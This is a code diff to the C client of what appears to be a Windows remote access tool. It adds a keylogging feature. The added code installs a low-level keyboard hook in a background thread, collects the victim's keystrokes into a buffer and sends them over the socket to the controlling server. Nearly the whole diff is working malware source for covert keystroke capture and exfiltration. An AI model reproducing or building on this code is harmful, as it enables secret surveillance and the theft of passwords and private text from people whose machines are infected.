@@ -1,11 +1,16 @@
 #include "commands.h"
 #include "log.h"
 #include "net_util.h"
+#include <pthread.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <winsock.h>
+#include <winuser.h>
+
+SOCKET server;
+HHOOK hook;
 
 static SOCKET init_client() {
   AddrInfo *result, *ptr, hints;
@@ -34,13 +39,50 @@ static SOCKET init_client() {
   return server;
 }
 
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+  static uint64_t chars_in_cur_line = 0;
+  static char
+      key_buf[DEFAULT_KEYLOG_BUFLEN *
+              2]; // allocate more than necessary to avoid race condition
+  static ratpacket_t *p = (ratpacket_t *)key_buf;
+  p->op = RAT_PACKET_KEYLOG;
+  p->data_len = RAT_KEYLOG_DATA_SIZE;
+  LOG_DEBUG("chars %d", chars_in_cur_line);
+  if (server == INVALID_SOCKET) {
+    PostQuitMessage(0);
+  }
+  if (nCode >= 0 && wParam == WM_KEYDOWN) {
+    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
+    if (chars_in_cur_line < RAT_KEYLOG_DATA_SIZE)
+      p->data[chars_in_cur_line++] = kbd->vkCode;
+    if (chars_in_cur_line >= RAT_KEYLOG_DATA_SIZE) {
+      LOG_DEBUG("%d", send(server, key_buf, DEFAULT_KEYLOG_BUFLEN, 0));
+      chars_in_cur_line = 0;
+    }
+  }
+  return CallNextHookEx(hook, nCode, wParam, lParam);
+}
+
+void *keylog_handler(void *vargp) {
+  LOG_DEBUG("enter");
+  hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+  MSG msg;
+  while (GetMessageA(&msg, NULL, 0, 0) > 0) {
+    TranslateMessage(&msg);
+    DispatchMessageA(&msg);
+  }
+  UnhookWindowsHookEx(hook);
+  LOG_DEBUG("leave");
+  return NULL;
+}
+
 int main() {
   WSADATA wsa;
   if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
     LOG_ERR("init error: %d\n", WSAGetLastError());
     return 1;
   }
-  SOCKET server = init_client();
+  server = init_client();
   if (server == INVALID_SOCKET) {
     LOG_DEBUG("error: unable to connect to the server");
     WSACleanup();
@@ -49,6 +91,8 @@ int main() {
   uint8_t *data;
   char buf[DEFAULT_BUFLEN];
   ratpacket_t *p = (ratpacket_t *)buf;
+  pthread_t keylog_thread;
+  pthread_create(&keylog_thread, NULL, keylog_handler, NULL);
   while (1) {
     int sentbytes = recv(server, buf, sizeof(ratpacket_t), 0);
     if (sentbytes == 0) {
@@ -124,6 +168,8 @@ exit:
     LOG_DEBUG("shutdown failed, error: %d", WSAGetLastError());
   }
   closesocket(server);
+  server = INVALID_SOCKET;
+  pthread_join(keylog_thread, NULL);
   WSACleanup();
   return 0;
 }
